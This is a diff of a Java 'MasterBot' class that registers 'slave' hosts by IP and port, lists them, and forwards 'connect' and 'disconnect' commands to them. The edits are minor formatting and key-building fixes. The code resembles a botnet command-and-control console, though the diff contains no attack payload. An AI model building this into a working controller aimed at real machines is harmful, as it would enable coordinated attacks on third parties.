@@ -65,6 +65,7 @@ public class MasterBot implements Runnable {
 		storeSlaveData(slv1);
 	}
 
+	// slave registration here 
 	public static void storeSlaveData(SlaveData slaveObj){
 
 		String uniqueStr = concatinatedData(slaveObj.ip, slaveObj.port);
@@ -80,7 +81,7 @@ public class MasterBot implements Runnable {
 	}
 
 	public static String concatinatedData(String ip, String port){
-		String concatinate = ip;
+		String concatinate = ip+port;
 		return concatinate;
 	}
 
@@ -93,7 +94,7 @@ public class MasterBot implements Runnable {
 			SlaveData localObjSlave = entry.getValue();
 			Date date = new Date();
 			if (localObjSlave.status == flag.registred){
-				System.out.print(localObjSlave.ip + "\t" + localObjSlave.port + "\t" + localObjSlave.registerDate.format(date));
+				System.out.println(localObjSlave.ip + "\t" + localObjSlave.port + "\t" + localObjSlave.registerDate.format(date));
 			}
 		}
 	}
@@ -154,13 +155,13 @@ public class MasterBot implements Runnable {
 		Scanner scanner = new Scanner(System.in);
 		System.out.print("> ");
 		while (!scanner.hasNext("quit")){
-			System.out.print("> ");
+			System.out.print(">");
 			String command = scanner.nextLine();
 			if (command.startsWith("list")){
 				listSlaves();
 			}
 			else if (command.startsWith("connect") || command.startsWith("disconnect")){
-				System.out.println("going to connect/disconnect  the slave");
+				//System.out.println("going to connect/disconnect  the slave");
 				sendToSlave(command);
 			}
 		
